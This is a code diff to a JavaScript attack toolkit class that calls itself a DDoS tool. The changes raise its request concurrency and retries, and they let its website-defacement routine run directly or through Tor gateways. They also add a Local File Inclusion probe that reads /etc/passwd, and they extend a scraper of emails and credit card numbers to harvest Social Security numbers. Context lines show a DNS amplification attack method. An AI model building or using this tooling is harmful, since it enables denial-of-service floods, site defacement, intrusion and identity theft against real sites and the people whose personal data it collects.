@@ -39,14 +39,14 @@ class Tor {
         ];
         this.currentIndex = 0;
         this.failedGateways = new Set();
-        this.maxRetries = 3;
-        this.requestTimeout = 5000;
-        this.gatewayCheckInterval = 60000;
+        this.maxRetries = 5;
+        this.requestTimeout = 8000;
+        this.gatewayCheckInterval = 30000;
         this.userAgent = 'Noodles/1.0 (DDoS Tool)';
         this.customHeaders = {};
         this.requestQueue = [];
         this.isProcessingQueue = false;
-        this.maxConcurrentRequests = 50;
+        this.maxConcurrentRequests = 200;
         this.initRequestQueue();
         this.bypassCache = true;
         this.defaceScript = null;
@@ -55,22 +55,42 @@ class Tor {
         this.honeypotData = {};
         this.debug = false;
         this.requestStats = {
-          sent: 0,
-          success: 0,
-          failed: 0
+            sent: 0,
+            success: 0,
+            failed: 0,
+            bytesSent: 0,
+            bytesReceived: 0
         };
-        this.statUpdateInterval = 1000;
+        this.statUpdateInterval = 500;
         this.startStatUpdates();
+        this.serverIP = null;
+        this.serverResponse = null;
+        this.initServerInfo();
+        this.errorThreshold = 50;
+        this.errorCount = 0;
+        this.rateLimitDelay = 2000;
+        this.useTorForDeface = false;
+    }
+
+    async initServerInfo() {
+        try {
+            const response = await this.rawFetch('/');
+            this.serverIP = response.headers.get('server') || 'Unknown';
+            this.serverResponse = await response.text();
+            this.log(`Server IP: ${this.serverIP}`, 'info');
+        } catch (error) {
+            this.log(`Error getting server info: ${error}`, 'warn');
+        }
     }
 
     startStatUpdates() {
-      setInterval(() => {
-        this.dispatchEvent('statsUpdate', this.getRequestStats());
-      }, this.statUpdateInterval);
+        setInterval(() => {
+            this.dispatchEvent('statsUpdate', this.getRequestStats());
+        }, this.statUpdateInterval);
     }
 
     getRequestStats() {
-      return { ...this.requestStats };
+        return { ...this.requestStats };
     }
 
     log(message, level = 'info') {
@@ -121,9 +141,12 @@ class Tor {
                 continue;
             }
             const { url, options, resolve, reject } = this.requestQueue.shift();
-            this.executeTorRequest(url, options)
-                .then(resolve)
-                .catch(reject);
+            try {
+              const response = await this.executeTorRequest(url, options);
+              resolve(response);
+            } catch (error) {
+              reject(error);
+            }
         }
 
         this.isProcessingQueue = false;
@@ -183,73 +206,105 @@ class Tor {
     }
 
     async executeTorRequest(url, options = {}, retryCount = 0) {
-        if (this.failedGateways.size === this.gateways.length) {
-            const errorMessage = "All Tor gateways are unavailable.";
-            this.log(errorMessage, 'error');
-            this.requestStats.failed++;
-            throw new Error(errorMessage);
-        }
+      if (this.failedGateways.size === this.gateways.length) {
+        const errorMessage = "All Tor gateways are unavailable.";
+        this.log(errorMessage, 'error');
+        this.requestStats.failed++;
+        throw new Error(errorMessage);
+      }
 
-        let gateway = this.gateways[this.currentIndex];
-        let attempts = 0;
-        while (this.failedGateways.has(gateway) && attempts < this.gateways.length) {
-            this.currentIndex = (this.currentIndex + 1) % this.gateways.length;
-            gateway = this.gateways[this.currentIndex];
-            attempts++;
-        }
-
-        if (this.failedGateways.has(gateway)) {
-            const errorMessage = "No available Tor gateways.";
-            this.log(errorMessage, 'error');
-            this.requestStats.failed++;
-            throw new Error(errorMessage);
-        }
-
+      let gateway = this.gateways[this.currentIndex];
+      let attempts = 0;
+      while (this.failedGateways.has(gateway) && attempts < this.gateways.length) {
         this.currentIndex = (this.currentIndex + 1) % this.gateways.length;
-        let torURL = `${gateway}/${url}`;
+        gateway = this.gateways[this.currentIndex];
+        attempts++;
+      }
 
-        if (this.bypassCache) {
-            torURL += (url.includes('?') ? '&' : '?') + `cacheBuster=${Date.now()}`;
+      if (this.failedGateways.has(gateway)) {
+        const errorMessage = "No available Tor gateways.";
+        this.log(errorMessage, 'error');
+        this.requestStats.failed++;
+        throw new Error(errorMessage);
+      }
+
+      this.currentIndex = (this.currentIndex + 1) % this.gateways.length;
+      let torURL = `${gateway}/${url}`;
+
+      if (this.bypassCache) {
+        torURL += (url.includes('?') ? '&' : '?') + `cacheBuster=${Date.now()}`;
+      }
+
+      try {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), this.requestTimeout);
+        const allHeaders = { ...options.headers, 'User-Agent': this.userAgent, ...this.customHeaders };
+        const response = await fetch(torURL, { ...options, signal: controller.signal, headers: allHeaders });
+        clearTimeout(timeoutId);
+
+        if (!response.ok) {
+          this.failedGateways.add(gateway);
+          this.log(`Gateway ${gateway} failed. Adding to blacklist.`, 'warn');
+          this.requestStats.failed++;
+          this.errorCount++;
+
+          if (this.errorCount > this.errorThreshold) {
+            await new Promise(resolve => setTimeout(resolve, this.rateLimitDelay));
+            this.errorCount = 0;
+          }
+
+          if (retryCount < this.maxRetries) {
+            this.log(`Retrying with a different gateway. Retry count: ${retryCount + 1}`, 'info');
+            return this.executeTorRequest(url, options, retryCount + 1);
+          } else {
+            const errorMessage = `HTTP error! status: ${response.status} - Max retries reached.`;
+            this.log(errorMessage, 'error');
+            throw new Error(errorMessage);
+          }
         }
 
-        try {
-            const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), this.requestTimeout);
-            const allHeaders = { ...options.headers, 'User-Agent': this.userAgent, ...this.customHeaders };
-            const response = await fetch(torURL, { ...options, signal: controller.signal, headers: allHeaders });
-            clearTimeout(timeoutId);
+        const responseBytes = await this.getResponseBytes(response);
+        this.requestStats.success++;
+        this.requestStats.bytesReceived += responseBytes;
+        this.log(`Request successful: ${url} - ${responseBytes} bytes`, 'info');
+        return response;
 
-            if (!response.ok) {
-                this.failedGateways.add(gateway);
-                this.log(`Gateway ${gateway} failed. Adding to blacklist.`, 'warn');
-                this.requestStats.failed++;
-                if (retryCount < this.maxRetries) {
-                    this.log(`Retrying with a different gateway. Retry count: ${retryCount + 1}`, 'info');
-                    return this.executeTorRequest(url, options, retryCount + 1);
-                } else {
-                    const errorMessage = `HTTP error! status: ${response.status} - Max retries reached.`;
-                    this.log(errorMessage, 'error');
-                    throw new Error(errorMessage);
-                }
-            }
+      } catch (error) {
+        this.failedGateways.add(gateway);
+        this.log(`Tor fetch error with gateway ${gateway}: ${error}`, 'error');
+        this.requestStats.failed++;
+        this.errorCount++;
 
-            this.log(`Request successful: ${url}`, 'info');
-            this.requestStats.success++;
-            return response;
-        } catch (error) {
-            this.failedGateways.add(gateway);
-            this.log(`Tor fetch error with gateway ${gateway}: ${error}`, 'error');
-            this.requestStats.failed++;
-
-            if (retryCount < this.maxRetries) {
-                this.log(`Retrying with a different gateway. Retry count: ${retryCount + 1}`, 'info');
-                return this.executeTorRequest(url, options, retryCount + 1);
-            } else {
-                const finalErrorMessage = "Max retries reached. Marking URL as potentially unreachable.";
-                this.log(finalErrorMessage, 'error');
-                throw error;
-            }
+        if (this.errorCount > this.errorThreshold) {
+          await new Promise(resolve => setTimeout(resolve, this.rateLimitDelay));
+          this.errorCount = 0;
         }
+
+        if (retryCount < this.maxRetries) {
+          this.log(`Retrying with a different gateway. Retry count: ${retryCount + 1}`, 'info');
+          return this.executeTorRequest(url, options, retryCount + 1);
+        } else {
+          const finalErrorMessage = "Max retries reached. Marking URL as potentially unreachable.";
+          this.log(finalErrorMessage, 'error');
+          throw error;
+        }
+      }
+    }
+
+    async getResponseBytes(response) {
+      try {
+        const reader = response.body.getReader();
+        let totalBytes = 0;
+        while (true) {
+          const { done, value } = await reader.read();
+          if (done) break;
+          totalBytes += value.length;
+        }
+        return totalBytes;
+      } catch (error) {
+        this.log(`Error reading response body: ${error}`, 'warn');
+        return 0;
+      }
     }
 
     fetchWithTor(url, options = {}) {
@@ -274,7 +329,7 @@ class Tor {
             body: JSON.stringify(data),
             redirect: 'follow'
         };
-
+        this.requestStats.bytesSent += JSON.stringify(data).length;
         try {
             const response = await this.fetchWithTor(url, options);
             this.dispatchEvent('log', { message: `POST request successful: ${url}`, level: 'info' });
@@ -315,7 +370,6 @@ class Tor {
             body: JSON.stringify(data),
             redirect: 'follow'
         };
-
         try {
             const response = await this.rawFetch(url, options);
             this.dispatchEvent('log', { message: `Raw POST request successful: ${url}`, level: 'info' });
@@ -340,7 +394,9 @@ class Tor {
         }
 
         try {
-            const response = await this.fetchWithTor(url, { method: 'GET' });
+            const fetchMethod = this.useTorForDeface ? this.fetchWithTor.bind(this) : this.rawFetch.bind(this);
+            const response = await fetchMethod(url, { method: 'GET' });
+
             if (!response.ok) {
                 throw new Error(`Failed to fetch the website. Status: ${response.status}`);
             }
@@ -367,7 +423,7 @@ class Tor {
                 redirect: 'follow'
             };
 
-            const putResponse = await this.fetchWithTor(url, options);
+            const putResponse = await fetchMethod(url, options);
 
             if (putResponse.ok) {
                 const successMessage = 'Website defaced successfully!';
@@ -407,6 +463,7 @@ class Tor {
         if (data) {
             options.body = JSON.stringify(data);
             options.headers['Content-Type'] = 'application/json';
+            this.requestStats.bytesSent += JSON.stringify(data).length;
         }
 
         try {
@@ -455,6 +512,18 @@ class Tor {
                 if (sqliError.message.includes('SQL syntax')) {
                     return { vulnerable: true, type: 'SQL Injection', details: `SQL syntax error indicates possible SQL Injection vulnerability.` };
                 }
+            }
+
+            const lfiPayload = "/etc/passwd";
+            const lfiTestURL = `${url}?file=${lfiPayload}`;
+            try {
+                const lfiResponse = await this.fetchWithTor(lfiTestURL, { method: 'GET' });
+                const lfiContent = await lfiResponse.text();
+                if (lfiContent.includes("root:")) {
+                    return { vulnerable: true, type: 'Local File Inclusion', details: `LFI payload detected: able to read /etc/passwd.` };
+                }
+            } catch (lfiError) {
+                this.log(`LFI check error: ${lfiError.message}`, 'warn');
             }
 
             return { vulnerable: false, details: 'No immediate vulnerabilities detected.' };
@@ -590,15 +659,18 @@ class Tor {
             const emailRegex = /[\w.-]+@[\w.-]+\.[\w]+/g;
             const ipAddressRegex = /(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)/g;
             const creditCardRegex = /\b(?:\d[ -]*?){13,16}\b/g;
+            const socialSecurityRegex = /\b\d{3}[- ]?\d{2}[- ]?\d{4}\b/g;
 
             const emails = pageContent.match(emailRegex) || [];
             const ipAddresses = pageContent.match(ipAddressRegex) || [];
             const creditCards = pageContent.match(creditCardRegex) || [];
+            const socialSecurityNumbers = pageContent.match(socialSecurityRegex) || [];
 
             this.honeypotData[url] = {
                 emails: [...new Set(emails)],
                 ipAddresses: [...new Set(ipAddresses)],
-                creditCards: [...new Set(creditCards)]
+                creditCards: [...new Set(creditCards)],
+                socialSecurityNumbers: [...new Set(socialSecurityNumbers)]
             };
 
             this.log(`Honeypot data collected from ${url}`, 'info');
@@ -610,7 +682,7 @@ class Tor {
     }
 
     getHoneypotData(url) {
-        return this.honeypotData[url] || { emails: [], ipAddresses: [], creditCards: [] };
+        return this.honeypotData[url] || { emails: [], ipAddresses: [], creditCards: [], socialSecurityNumbers: [] };
     }
 
     async dnsAmplificationAttack(targetIP, spoofIP, packetsPerSecond = 500, duration = 60) {
@@ -740,6 +812,11 @@ class Tor {
             this.dispatchEvent('exploitEnd', { target: url, vulnerabilityType });
             return null;
         }
+    }
+
+    setUseTorForDeface(useTor) {
+      this.useTorForDeface = useTor;
+      this.log(`Use Tor for deface set to: ${useTor}`, 'info');
     }
 }
 
